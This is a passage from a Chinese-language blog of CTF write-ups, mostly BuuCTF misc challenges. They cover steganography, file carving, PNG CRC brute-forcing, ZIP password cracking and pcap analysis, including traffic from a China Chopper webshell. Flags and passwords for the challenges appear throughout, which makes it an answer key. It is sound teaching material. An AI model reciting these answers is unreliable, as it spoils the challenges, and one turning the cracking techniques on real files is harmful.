class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img1 = Image.open(<span class="string">&quot;00000000.png&quot;</span>)</span><br><span class="line">im1 = img1.load()</span><br><span class="line"></span><br><span class="line">img2 = Image.open(<span class="string">&quot;00006909.png&quot;</span>)</span><br><span class="line">im2 = img2.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img1.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span>(im1[x,y]!=im2[x,y]):</span><br><span class="line">            print(im1[x,y],im2[x,y])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1, 0, 42) (1, 0, 1)</span><br><span class="line">(1, 0, 42) (1, 0, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br><span class="line">(2, 1, 43) (2, 1, 0)</span><br><span class="line">(2, 1, 43) (2, 1, 1)</span><br></pre></td></tr></table></figure><p>发现rgb的b通道都是0或者1，提取出来八个一组转化为二进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">img1 = Image.open(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line">im1 = img1.load()</span><br><span class="line"></span><br><span class="line">img2 = Image.open(<span class="string">&quot;2.png&quot;</span>)</span><br><span class="line">im2 = img2.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">flag1=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img1.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span>(im1[x,y]!=im2[x,y]):</span><br><span class="line">            flag+=str(im2[x,y][<span class="number">2</span>])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">8</span>):</span><br><span class="line">    flag1+=chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag1)</span><br></pre></td></tr></table></figure><p>拿到flag。</p><h1 id="BuuCtf"><a href="#BuuCtf" class="headerlink" title="BuuCtf"></a>BuuCtf</h1><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;1# convert aaa.gif flag.png</span><br></pre></td></tr></table></figure><p>从分理出的图片拿到flag。</p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>扫码提示<code>secret is here</code>。</p><p>binwalk分离拿到一个压缩包，名字为<code>4number</code>暴力破解拿到密码<code>7639</code>。</p><h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>拿到一个exe程序，直接<code>root@root:~/桌面/flag# strings &#39;/root/桌面/flag/output/zip/KEY.exe&#39; </code>。</p><p>拿到一个图片base64，放入浏览器解码。是个二维码扫描得到flag。</p><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>直接PNG修改高度。</p><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>binwalk分离不出东西来，直接<code>strings</code>，拿到flag。</p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>一个压缩包题目提示破解，四位数字，拿到密码之后，打开是base64解码拿到flag。</p><p><code>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</code></p><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p><code>strings</code>命令拿到flag。</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>提示LSB直接使用kali的zsteg。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/output/zip/flag11.png&#x27; </span></span><br><span class="line">imagedata           .. text: <span class="string">&quot;00010,&amp;&amp;\&quot;&quot;</span></span><br><span class="line">b1,rgb,lsb,xy       .. file: PNG image data, <span class="number">280</span> x <span class="number">280</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br></pre></td></tr></table></figure><p>可以看到rgb的lsb通道有一个PNG，直接上stegsolve，使用save bin功能，不要用save Text功能，保存为1.png。拿到二维码扫描得到flag。</p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>文件属性拿到flag。</p><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>直接过滤http流量，找到一个登录界面拿到flag。</p><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>拿到一张图片，为jpg，提示密码是四位数字，想到steghide，但是不会爆破，binwalk分析，有一个zip，尝试foremost分离，分离出好多的文件夹，就是没有文件，尝试dd命令，拿到压缩包，爆破密码，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39;  of&#x3D;flag.zip skip&#x3D;38689 bs&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>png图片直接上zsteg。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;steg.png&#39; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meta date:create    .. text: &quot;2013-01-17T17:35:32-05:00&quot;</span><br><span class="line">meta date:modify    .. [same as &quot;meta date:create&quot;]</span><br><span class="line">imagedata           .. text: &quot;\&quot;&amp;&amp;\&quot;4&amp;$&gt;8:&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;Hey I think we can write safely in this file without anyone seeing it. Anyway, the secret key is: st3g0_saurus_wr3cks&quot;</span><br><span class="line">b2,r,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,g,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,b,msb,xy         .. text: [&quot;U&quot; repeated 178 times]</span><br><span class="line">b2,rgb,msb,xy       .. text: [&quot;U&quot; repeated 22 times]</span><br><span class="line">b2,bgr,msb,xy       .. text: [&quot;U&quot; repeated 22 times]</span><br><span class="line">b4,r,msb,xy         .. text: [&quot;w&quot; repeated 100 times]</span><br><span class="line">b4,g,msb,xy         .. file: MPEG ADTS, layer I, v2, 112 kbps, JntStereo</span><br><span class="line">b4,b,msb,xy         .. text: [&quot;w&quot; repeated 100 times]</span><br></pre></td></tr></table></figure><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提示找文件，打开文件，查看总体协议分级。有http流量，直接过滤http。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/40.png" alt="40"></p><p>右键-&gt;显示分组字节流-&gt;显示为图像。对图片<code>strings</code>命令拿到flag。</p><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><p>使用<code>string</code>命令，可以看到有RAR文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.jpg&#39; </span><br><span class="line">Rar!</span><br><span class="line">2.txt~</span><br><span class="line">fi#E</span><br><span class="line">-s%n</span><br></pre></td></tr></table></figure><p><code>foremost</code>分离拿到rar，爆破拿到flag。</p><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>拿到一个图片，binwalk分离得到一个压缩包，需要密码。<code>strings jpg</code>，看到有<code>&lt;?xpacket begin=</code>信息，说明图片属性有信息，查看图片属性发现一个字符串，作为密码解压拿到flag。</p><p>一个流量包，打开之后发现只有TCP协议，协议分析发现也带有数据(Data)。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/41.png" alt="41"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/42.png" alt="42"></p><p>接着查看每个数据包，发现有的数据包有Data字段，第一个为F，第二个为L。正好是flag字段，尝试<code>tshark</code>提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r easycap.pcap -T fields -e &quot;data.data&quot; | tr &quot;\n&quot; &quot; &quot; | sort -u</span><br></pre></td></tr></table></figure><p>截取到十六进制，转ascii拿到flag。</p><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p><code>strings</code>图片，末尾有二进制数据，查看长度为56，为八的倍数，直接转化字符串，得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady=<span class="string">&quot;01101011011011110110010101101011011010100011001101110011&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(steady[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">koekj3s</span><br></pre></td></tr></table></figure><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>png图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/2.png&#x27; </span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39;  --all</span><br><span class="line">imagedata           .. text: &quot;KK&lt;220\r\r&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. file: Zip archive data, at least v2.0 to extract</span><br><span class="line">b1,bgr,msb,xy       .. text: &quot;saZ$S:&#39;6&quot;</span><br><span class="line">b2,r,msb,xy         .. file: PGP\011Secret Sub-key -</span><br></pre></td></tr></table></figure><p>有zip文件，stegsolve提取出来，有一个没有后缀的文件。</p><p>放入winhex，发现是个<code>ELF文件</code>。</p><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>盲文拿到密码，拿到一个音频。音频是一个短杠、长杆，短杠为.，长杠为-。拿到莫斯解码，拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</span><br></pre></td></tr></table></figure><h3 id="隐藏的密码"><a href="#隐藏的密码" class="headerlink" title="隐藏的密码"></a>隐藏的密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;隐藏的钥匙.jpg&#39; | grep &quot;flag&quot;</span><br><span class="line">flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE&#x3D;)</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h3><p>伪加密，解压一个没有后缀的文件，放入。winhex，有点像PNG，但是缺少头加入<code>89 50 4E 47 0D 0A 1A 0A</code>。</p><p>一定要注意，不能先修改文件后缀，要在原始的文件上修改，然后在修改名字。拿到一串数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">424A447B79316E677A756973687561697D</span><br></pre></td></tr></table></figure><p>一开始以为是md5，尝试十六进制解码，拿到flag。</p><h3 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h3><p><code>zsteg</code>分析没有信息，尝试binwalk，分理出一个图片，在linux打开打不开，提示CRC有问题。但是在win上可以打开。肯定是CRC爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">m = open(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0xC2C143B3</span>:</span><br><span class="line">            p=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(c)</span></span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>一定要查看CRC值，然后修改脚本，别忘了修改。</p><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>爆破压缩包，解密brainfuck解码。</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>RouterPassView解密。</p><h3 id="来首歌曲"><a href="#来首歌曲" class="headerlink" title="来首歌曲"></a>来首歌曲</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure><p>莫斯密码，拿到flag。</p><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>打开分析协议，有http协议，发现有数据，很多字符，最有有一个=，考虑base64图片，加入头放入浏览器显示错误。</p><p>直接解密base64，转化为图片拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/43.png" alt="43"></p><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>binwalk 分理出压缩包，伪加密，拿到两个压缩包。拿到一张图片，尝试setghide。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steghide.exe extract -sf C:\Users\12521\Desktop\good-已合并.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;ko.txt&quot;.</span><br></pre></td></tr></table></figure><p>拿到另一个压缩包密码，解密拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bV1g6t5wZDJif^J7</span><br></pre></td></tr></table></figure><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>binwalk 分离出一个vmdk文件，使用7z解压，拿到文件，文件中有brainfuck，解密。</p><p><code>flag&#123;N7F5_AD5</code>。</p><p>另一半在文件<code>where_is_flag_part_two.txt</code>中，但是提示flag不在这里，很可能是ntf隐写。使用7z压缩也你能看到具有隐写数据。使用工具提取隐写数据，是ook编码，直接解码拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/44.png" alt="44"></p><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>提示刷新，F5隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java Extract C:\Users\12521\Desktop\Misc.jpg</span><br><span class="line">Huffman decoding starts</span><br><span class="line">Permutation starts</span><br><span class="line">309504 indices shuffled</span><br><span class="line">Extraction starts</span><br><span class="line">Length of embedded file: 190 bytes</span><br><span class="line">(1, 31, 5) code used</span><br></pre></td></tr></table></figure><p>拿到一个压缩包，伪加密，拿到flag。</p><h3 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h3><p><code>strings</code>分析一下，最后末尾有十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;meihuai.jpg&#39; | grep &quot;7312c31&quot; &gt; q.txt</span><br></pre></td></tr></table></figure><p>放入notepadd++，十六进制转换ascii。一群坐标画图 ，可以使用脚本，也可以使用kali的<code>gnuplot</code>,主要该工具去需要去掉<code>（）</code>、以及逗号变成空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuplot&gt; plot &#39;&#x2F;root&#x2F;q.txt&#39;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h3><p>jpg文件，<code>stings</code>看到有图片附加属性直接，查看找到编码<code>諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code>，解码拿到密码。<code>gemlovecom</code>,根据题目提示去掉com。</p><p>jpg、拿到密码。想到<code>steghide</code>、<code>jphsiwn</code>都不好使，最后outguess解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# outguess -k &quot;gemlove&quot; -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;sheng_huo_zhao_zhao.jpg&#39; .&#x2F;out.txt</span><br></pre></td></tr></table></figure><p>菜刀666</p><p>提示菜刀，应该与链接shell有关直接，搜索http流量，追踪TCP，第七个流可以看到，z2参数是一个图片的十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFD8FFE000104A46494600010101007800780000FFDB00430001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFDB00430101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFC0001108013901E203012200021101031101FFC4001F0000010501010101010100000000000000000102030405060708090A0BFFC400B5100002010303020403050504040000017D01020300041105122131410613516107227114328191A1082342B1C11552D1F02433627282090A161718191A25262728292A3435363738393A434445464748494A535455565758595A636465666768696A737475767778797A838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE1E2E3E4E5E6E7E8E9EAF1F2F3F4F5F6F7F8F9FAFFC4001F0100030101010101010101010000000000000102030405060708090A0BFFC400B51100020102040403040705040400010277000102031104052131061241510761711322328108144291A1B1C109233352F0156272D10A162434E125F11718191A262728292A35363738393A434445464748494A535455565758595A636465666768696A737475767778797A82838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE2E3E4E5E6E7E8E9EAF2F3F4F5F6F7F8F9FAFFDA000C03010002110311003F00FC18823DB907E62481211D6493F86143D914E012BCF5E30056C4310192E7D0CC40EFFC30478E3B0DFF00FD8F352DA3DBB0AF0769F2C1FF00964839699CF3866C9C11CF719E33AD6F1B7C840EB930AB71C672D7327B0C1D99EC0632179FF49A8C75F376FF002FB9DFAD9BE65D66EDFE56D79EFADBB3D9AB5BE4AC95FB69D5455EDC28724C9C703CD238D89FC30A1F523AE3D4F6539D88632E4EE013080CA57FE58C5FC31A7FD34933F377E7DCD54B78F714DA0B00711038F9DC7DF9DFFD95E703FA6EAD98101D8A83702FF20FF9ED3779187FCF34391CF5F539AF568C36EFDF7BAD36F5BBDBBE9F146DE3D79F4DDAFBAFA2F93D1EFA2B35B4657B90A6428036314F7C5BC1F967CC7DDCF7391D0B1C6CDBA6D0BB70A4292B9FF963177918FF00CF47E3033B88C6324A8AAB020551D24F9B1EF7336781D4131A13C738C7BB606BDBC4064B82FF0030DF8EB34BD5635C7F021C671DBA0C9435EA528EDE56FF0087D3F357B745A42FE4566B5F3EFADB656B3F5B5B4ECDABD465BB78CFC85540620B421B811A1FBD7327FB47036E4F5E47DD4AD7B78F732141F2AFFA856EE73FBCB993B0C6D2573C63D81354E14C96DDF32EE5F39971FBC906365B45D72A300311C71E8A2B6A353921B19E3CE65FE151F72DA3C74E061B6F4C73F74E7D6A11DB4ED7B697DBEE4ADD3E1B69750478D5A5ABD6FA7E76F4BEEBD6FAD9CED1B70A9F9047F30DC7C956E3CD9070F3B8FEEA9FBBBBD30790D5A70C61400079997C2E7ADCCFD0B9C9E638B2703EEFA9059B15E24DBB830D8DB479C47FCB284E36C080E7E77380D9FA1CE18D694319272C446760DDD48B780F0101EF2CB9C63A9CF62C71D96D52D36DBB256F5B7CF6B59E91A89F0DDEBAE8DAEFEF6D6775BEFBADEF74BDEA76B3146A796CBA87191D4DCDC765F689339EA3D7A30AD2452C4863B81606661FF2DA5FE18131D634E99E871C7F05578D1890061095C8E9FE8D6F9E588FF9EB27FDF4739C7231A50AE31B1761DA7C90DD228BF8E77E9991F1F29FCB036D633F5BEB6DB7DBBBBBED67D1D9FC53B1DAD6FCB5F77B2E8F5D34D2F1D234D132A80AE1B9191F6865C7CEF91E5DAC479000C00D8E383D768274228FEF997E5F957CF2BFC080FC96B10E992061B1C7639C1CD6817E68D93E5C026DD58E3681FEB2EE5E31938F97F4E0569449911845DDC9F20360177FE3BA9472768C1DBBB8E3BED6AC65E7E49F7D96BFD6AEFDE7A5C6EBF0FD2FDED64BD15B4BAA7EFCF1A925B71F2C8502523FE5DE0E36DBC7C9FDEC9FC407AF3D58D68C719C8C811B6C191DAD6D880428FF00A6D367A9E72D83C9E2181154290BBF2FFB907ACF3FF14CF9CFEEE3C9DBDB8C673BB1A10A0C8209972FC64737574739FF00B631E7BFB74DD9ACDAEB7F56AFBBB79BE8FA6FAB5ACA08B4ECBBF65F774FD1EBF65E91A97B51272368F2D8A7C993C5B5B7F148DEB2C808E7A927B6401A502636140148563086E9145FC7732678DCDD573CF1D32AA6ABC49B465BF7A0BE6423ADD5C725625EE618F8071818E9D462FA2E776FF9BE651315FF0096B20FB96D191C045230D8F4CE385AC24EDAAFC7A256D55BBFE9A69185ED6AD2FBBF0EFD3A6BFCD696B29DA68D598C6B12F393F6753D80FF0059792FE5F213D303070B83A512AA04D8371DC7C80DFF002D661F7EE65CF444E4A0ED800F462628D02EFDE493F2FDA5978FFAE76916327A0F9B1C0E49CEDE6F221258B9DA428F3D97FE5945C7976B1FFB4C461B1CF639C3679DEFE9AF6B6DF75B97ABD1AEBC8EF69A6D6FDD6FAEDF377BF6D6FD1CD5A7823CED0BFBD01C9894FF00CBD5CE7E69E4073FB</span><br></pre></td></tr></table></figure><p>保存之后是一个密码。</p><p>第九个流最后数据返回包是一个压缩包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|PK...........KQ...4...(.......flag.txtC......cS...J..Ea.v....&amp;e$K..2%..$..,..&#x3D;.J..1p..p46.PK..?..........KQ...4...(.....$....... .......flag.txt</span><br><span class="line">. .........J. ..p...o2.p...o2.p..PK..........Z...Z.....well,you need passwd!.|&lt;-</span><br></pre></td></tr></table></figure><p><code>|&lt;-</code>是菜刀的标志，十六进制标志为<code>2D3E7C</code>。</p><h3 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h3><h3 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h3><p>拿到一个图片，文件大小很大，所以直接<code>foremost</code>。拿到一个压缩包，解压里面还有个jpg图片。打开之后发现损坏，放入winhex，尝试修补头，但是发现是个avi文件。视频隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg</span><br></pre></td></tr></table></figure><p>扫描二维码得到flag。</p><h3 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h3><p>扫码，假flag。binwalk分析。</p><figure class="highlight 